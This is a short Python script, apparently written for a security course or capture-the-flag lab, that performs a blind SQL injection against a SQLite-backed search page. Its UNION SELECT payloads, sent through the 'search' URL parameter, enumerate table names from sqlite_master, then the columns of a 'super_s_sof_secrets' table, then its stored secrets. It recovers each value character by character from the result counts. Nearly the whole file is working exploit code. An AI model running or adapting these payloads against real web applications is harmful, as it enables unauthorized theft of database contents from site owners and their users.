import requests

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/?search="   

# Create a session
session = requests.session()
session.get(URL)

# Find results 
def get_content(payload):
    results = []

    # All possible characters
    a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" + '{' + '}' + '_' + ':' + ' '

    # Find initial letters of results to easy the search afterwards
    for l in a:
        r = session.get(URL + payload(l, 1))
        n = r.text.split("Found ")[1].split(" ")[0]
        if n != "0":
            results.append(l)

    # Find the rest of the letters of the results
    while len(results) != 0:
        for el in results:
            for l in a:
                r = session.get(URL + payload(el + l, len(l + el)))
                n = r.text.split("Found ")[1].split(" ")[0]
                if n != "0":
                    results.append(el + l)
            results.remove(el)
                  
        print(results)

# Find table name
def tables(match, i):
    return f"q' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND substr(tbl_name,1,{i}) == '{match}'; --"  
get_content(tables)

# Find column name
def columns(match, i):
    return f"q' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE substr(name,1,{i}) == '{match}'; --"  
get_content(columns)

# Find column content
def columns_content(match, i):
    return f"q' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE substr(secret,1,{i}) == '{match}'; --" 
get_content(columns_content)